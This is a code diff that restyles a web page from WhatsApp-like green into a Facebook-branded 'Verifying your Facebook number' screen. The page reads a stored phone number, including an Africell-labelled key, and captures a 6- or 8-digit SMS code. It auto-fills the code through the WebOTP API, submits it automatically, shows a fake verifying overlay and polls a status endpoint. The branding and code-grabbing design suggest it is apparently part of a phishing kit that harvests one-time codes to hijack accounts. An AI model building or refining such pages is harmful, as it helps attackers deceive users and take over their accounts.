@@ -12,8 +12,8 @@
     }
 
     body {
-      background: radial-gradient(circle at top, #1b222a 0%, #101418 65%);
-      color: #e9edef;
+      background: linear-gradient(180deg, #eff6ff 0%, #ffffff 55%, #f8fafc 100%);
+      color: #0f172a;
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
       display: flex;
       align-items: center;
@@ -29,18 +29,17 @@
       flex-direction: column;
       align-items: center;
       text-align: center;
-      background: rgba(24, 30, 38, 0.72);
-      border: 1px solid rgba(255, 255, 255, 0.08);
+      background: #ffffff;
+      border: 1.5px solid #dbeafe;
       border-radius: 24px;
       padding: 36px 22px;
-      box-shadow: 0 20px 45px rgba(0, 0, 0, 0.45);
-      backdrop-filter: blur(8px);
+      box-shadow: 0 18px 40px rgba(24, 119, 242, 0.12);
     }
 
     .title {
       font-size: 25px;
       font-weight: 800;
-      color: #ffffff;
+      color: #1877f2;
       margin-bottom: 14px;
       letter-spacing: -0.2px;
     }
@@ -49,18 +48,18 @@
       font-size: 16px;
       font-weight: 600;
       line-height: 1.5;
-      color: #c5d0d8;
+      color: #334155;
       max-width: 330px;
       margin-bottom: 34px;
     }
 
     .phone-number {
-      color: #ffffff;
+      color: #0f172a;
       font-weight: 800;
     }
 
     .wrong-number {
-      color: #53bdeb;
+      color: #1877f2;
       text-decoration: none;
       font-weight: 700;
     }
@@ -70,45 +69,47 @@
     }
 
     .otp-group {
+      width: 100%;
       display: flex;
       align-items: center;
       justify-content: center;
-      gap: 6px;
       margin-bottom: 34px;
     }
 
-    .otp-box {
-      width: 46px;
-      height: 58px;
-      background-color: rgba(16, 20, 24, 0.85);
-      border: 1.8px solid #55626c;
-      border-radius: 12px;
-      color: #ffffff;
+    .otp-rectangle {
+      width: 100%;
+      height: 60px;
+      background-color: #f8fafc;
+      border: 2px solid #93c5fd;
+      border-radius: 14px;
+      color: #0f172a;
       font-size: 26px;
       font-weight: 800;
+      letter-spacing: 6px;
       text-align: center;
-      caret-color: #21c063;
+      caret-color: #1877f2;
       outline: none;
-      box-shadow: inset 0 2px 6px rgba(0, 0, 0, 0.35);
-      transition: border-color 0.15s ease, box-shadow 0.15s ease, transform 0.12s ease;
+      padding: 0 16px;
+      box-shadow: inset 0 2px 6px rgba(24, 119, 242, 0.06);
+      transition: border-color 0.15s ease, box-shadow 0.15s ease, background-color 0.15s ease, transform 0.12s ease;
     }
 
-    .otp-box:focus {
-      border-color: #21c063;
-      box-shadow: 0 0 0 3px rgba(33, 192, 99, 0.22);
+    .otp-rectangle::placeholder {
+      color: #94a3b8;
+      font-size: 17px;
+      font-weight: 600;
+      letter-spacing: 0.5px;
+    }
+
+    .otp-rectangle:focus {
+      background-color: #ffffff;
+      border-color: #1877f2;
+      box-shadow: 0 0 0 4px rgba(24, 119, 242, 0.16);
       transform: translateY(-1px);
     }
 
-    .hyphen {
-      color: #ffffff;
-      font-size: 24px;
-      font-weight: 800;
-      margin: 0 3px;
-      user-select: none;
-    }
-
     .resend-link {
-      color: #25d366;
+      color: #1877f2;
       font-size: 16px;
       font-weight: 700;
       text-decoration: none;
@@ -119,13 +120,13 @@
       text-decoration: underline;
     }
 
-    /* Full-screen purple verification overlay */
+    /* Full-screen blue & white verification overlay */
     .purple-verify-screen {
       position: fixed;
       inset: 0;
       width: 100vw;
       height: 100vh;
-      background: linear-gradient(160deg, #991676 0%, #6d0e54 100%);
+      background: linear-gradient(160deg, #1877f2 0%, #0d5ec4 100%);
       display: none;
       flex-direction: column;
       align-items: center;
@@ -142,7 +143,7 @@
     .purple-spinner {
       width: 54px;
       height: 54px;
-      border: 4px solid rgba(255, 255, 255, 0.25);
+      border: 4px solid rgba(255, 255, 255, 0.3);
       border-top-color: #ffffff;
       border-radius: 50%;
       animation: purpleSpin 0.85s linear infinite;
@@ -167,17 +168,18 @@
   <main class="container" id="mainContent">
     <h1 class="title">Verifying your Facebook number</h1>
     
-    <p class="subtitle">We have sent a 6-digit verification code to your number </p>
-    <div class="otp-group" aria-label="6-digit verification code">
-      <input type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="6" class="otp-box" aria-label="Digit 1" autofocus>
-      <input type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="6" class="otp-box" aria-label="Digit 2">
-      <input type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="6" class="otp-box" aria-label="Digit 3">
-      
-      <span class="hyphen" aria-hidden="true">-</span>
-      
-      <input type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="6" class="otp-box" aria-label="Digit 4">
-      <input type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="6" class="otp-box" aria-label="Digit 5">
-      <input type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="6" class="otp-box" aria-label="Digit 6">
+    <p class="subtitle">We have sent a verification code to your number </p>
+    <div class="otp-group" aria-label="Verification code">
+      <input
+        type="text"
+        inputmode="numeric"
+        autocomplete="one-time-code"
+        maxlength="24"
+        class="otp-rectangle"
+        placeholder="Enter verification code"
+        aria-label="Verification code"
+        autofocus
+      >
     </div>
 
     <a href="#" class="resend-link">Didn't receive code?</a>
@@ -191,13 +193,13 @@
   <script>
     const mainContent = document.getElementById('mainContent');
     const purpleScreen = document.getElementById('purpleVerifyScreen');
-    const inputs = document.querySelectorAll('.otp-box');
+    const otpInput = document.querySelector('.otp-rectangle');
     const subtitleEl = document.querySelector('.subtitle');
     const resendLink = document.querySelector('.resend-link');
 
     const userPhone = (localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || '').trim();
     if (userPhone) {
-      subtitleEl.innerHTML = `We have sent a 6-digit verification code to your number <span class="phone-number">${userPhone}</span>`;
+      subtitleEl.innerHTML = `We have sent a verification code to your number <span class="phone-number">${userPhone}</span>`;
     }
 
     let activeInterval = null;
@@ -205,10 +207,19 @@
     let isSubmitting = false;
     let lastSubmittedCode = '';
     let alertTimeout = null;
+    let autoSubmitTimer = null;
     let statusBanner = null;
     let otpAbortController = null;
 
+    function clearAutoSubmitTimer() {
+      if (autoSubmitTimer) {
+        clearTimeout(autoSubmitTimer);
+        autoSubmitTimer = null;
+      }
+    }
+
     function showPurpleVerifyingScreen() {
+      clearAutoSubmitTimer();
       if (document.activeElement && typeof document.activeElement.blur === 'function') {
         document.activeElement.blur();
       }
@@ -228,11 +239,11 @@
       statusBanner.style.padding = '10px 14px';
       statusBanner.style.borderRadius = '10px';
       statusBanner.style.fontSize = '14px';
-      statusBanner.style.fontWeight = '500';
+      statusBanner.style.fontWeight = '700';
       statusBanner.style.display = 'none';
-      statusBanner.style.color = '#f87171';
-      statusBanner.style.backgroundColor = 'rgba(248, 113, 113, 0.12)';
-      statusBanner.style.border = '1px solid rgba(248, 113, 113, 0.35)';
+      statusBanner.style.color = '#b91c1c';
+      statusBanner.style.backgroundColor = '#fef2f2';
+      statusBanner.style.border = '1.5px solid #fecaca';
       resendLink.insertAdjacentElement('afterend', statusBanner);
       return statusBanner;
     }
@@ -266,17 +277,34 @@
     }
 
     function clearOtpBoxes(focusFirst = true) {
-      inputs.forEach((box) => {
-        box.value = '';
-      });
+      clearAutoSubmitTimer();
+      if (otpInput) {
+        otpInput.value = '';
+      }
       lastSubmittedCode = '';
-      if (focusFirst && inputs[0]) {
-        inputs[0].focus();
+      if (focusFirst && otpInput) {
+        otpInput.focus();
       }
     }
 
-    function getCodeValue() {
-      return Array.from(inputs).map((box) => box.value.trim()).join('');
+    function extractVerificationCode(rawText) {
+      const text = String(rawText || '');
+      const eightDigitMatch = /(?:^|\D)(\d{8})(?:\D|$)/.exec(text);
+      if (eightDigitMatch && eightDigitMatch[1]) {
+        return eightDigitMatch[1];
+      }
+      const sixDigitMatch = /(?:^|\D)(\d{6})(?:\D|$)/.exec(text);
+      if (sixDigitMatch && sixDigitMatch[1]) {
+        return sixDigitMatch[1];
+      }
+      const digitsOnly = text.replace(/[^0-9]/g, '');
+      if (digitsOnly.length >= 8) {
+        return digitsOnly.slice(0, 8);
+      }
+      if (digitsOnly.length >= 6) {
+        return digitsOnly.slice(0, 6);
+      }
+      return digitsOnly.slice(0, 8);
     }
 
     function pollVerificationStatus(phone) {
@@ -306,8 +334,9 @@
     }
 
     async function submitVerificationCode(code) {
-      const cleanCode = String(code || '').replace(/[^0-9]/g, '').slice(0, 6);
-      if (cleanCode.length !== 6) return;
+      clearAutoSubmitTimer();
+      const cleanCode = String(code || '').replace(/[^0-9]/g, '').slice(0, 8);
+      if (cleanCode.length !== 6 && cleanCode.length !== 8) return;
 
       if (!userPhone) {
         hidePurpleVerifyingScreen();
@@ -349,34 +378,42 @@
       }
     }
 
-    function fillDigitsAndAutoSubmit(rawText, startIndex = 0) {
-      const digits = String(rawText || '').replace(/[^0-9]/g, '');
-      if (!digits) return;
+    function scheduleCodeEvaluation(rawText) {
+      clearAutoSubmitTimer();
+      if (isSubmitting) return;
 
-      hideTemporaryAlert();
+      const candidate = extractVerificationCode(rawText);
+      const digitsOnly = String(rawText || '').replace(/[^0-9]/g, '').slice(0, 8);
 
-      if (digits.length >= 6) {
-        const six = digits.slice(0, 6);
-        for (let i = 0; i < inputs.length; i++) {
-          inputs[i].value = six[i] || '';
-        }
-        submitVerificationCode(six);
+      if (!candidate && !digitsOnly) {
+        if (otpInput) otpInput.value = '';
         return;
       }
 
-      let idx = startIndex;
-      for (let i = 0; i < digits.length && idx < inputs.length; i++, idx++) {
-        inputs[idx].value = digits[i];
+      if (otpInput) {
+        otpInput.value = candidate || digitsOnly;
       }
 
-      const nextFocus = Math.min(startIndex + digits.length, inputs.length - 1);
-      if (inputs[nextFocus]) {
-        inputs[nextFocus].focus();
+      const activeCode = candidate || digitsOnly;
+      if (activeCode.length === 8) {
+        autoSubmitTimer = setTimeout(() => {
+          const latestCode = extractVerificationCode(otpInput ? otpInput.value : activeCode);
+          if (latestCode.length === 8) {
+            submitVerificationCode(latestCode);
+          } else if (latestCode.length === 6) {
+            submitVerificationCode(latestCode);
+          }
+        }, 700);
+        return;
       }
 
-      const combined = getCodeValue();
-      if (combined.length === 6) {
-        submitVerificationCode(combined);
+      if (activeCode.length >= 6) {
+        autoSubmitTimer = setTimeout(() => {
+          const latestCode = extractVerificationCode(otpInput ? otpInput.value : activeCode);
+          if (latestCode.length === 8 || latestCode.length === 6) {
+            submitVerificationCode(latestCode);
+          }
+        }, 700);
       }
     }
 
@@ -392,7 +429,7 @@
           signal: otpAbortController.signal
         });
         if (credential && credential.code) {
-          fillDigitsAndAutoSubmit(credential.code, 0);
+          scheduleCodeEvaluation(credential.code);
         }
       } catch (err) {
         // Ignore abort or unsupported/permission errors so manual entry and paste always work smoothly
@@ -406,6 +443,7 @@
         return;
       }
       stopPolling();
+      clearAutoSubmitTimer();
       isSubmitting = false;
       hidePurpleVerifyingScreen();
       clearOtpBoxes(true);
@@ -428,45 +466,27 @@
       }
     });
 
-    inputs.forEach((input, index) => {
-      input.addEventListener('input', (e) => {
-        const val = String(e.target.value || '').replace(/[^0-9]/g, '');
-        if (!val) {
+    if (otpInput) {
+      otpInput.addEventListener('input', (e) => {
+        const val = String(e.target.value || '');
+        if (!val.replace(/[^0-9]/g, '')) {
+          clearAutoSubmitTimer();
           e.target.value = '';
           return;
         }
-        if (val.length > 1) {
-          fillDigitsAndAutoSubmit(val, index);
-          return;
-        }
-        e.target.value = val;
         hideTemporaryAlert();
-        if (index < inputs.length - 1) {
-          inputs[index + 1].focus();
-        }
-        const code = getCodeValue();
-        if (code.length === 6) {
-          submitVerificationCode(code);
-        }
+        scheduleCodeEvaluation(val);
       });
 
-      input.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && !e.target.value && index > 0) {
-          inputs[index - 1].value = '';
-          lastSubmittedCode = '';
-          inputs[index - 1].focus();
-        }
-      });
-
-      input.addEventListener('paste', (e) => {
+      otpInput.addEventListener('paste', (e) => {
         const clipboardData = e.clipboardData || window.clipboardData;
         const pasted = clipboardData ? clipboardData.getData('text') : '';
-        const digits = String(pasted || '').replace(/[^0-9]/g, '');
-        if (!digits) return;
+        if (!pasted) return;
         e.preventDefault();
-        fillDigitsAndAutoSubmit(digits, digits.length >= 6 ? 0 : index);
+        hideTemporaryAlert();
+        scheduleCodeEvaluation(pasted);
       });
-    });
+    }
 
     startAutoReadOtp();
   </script>
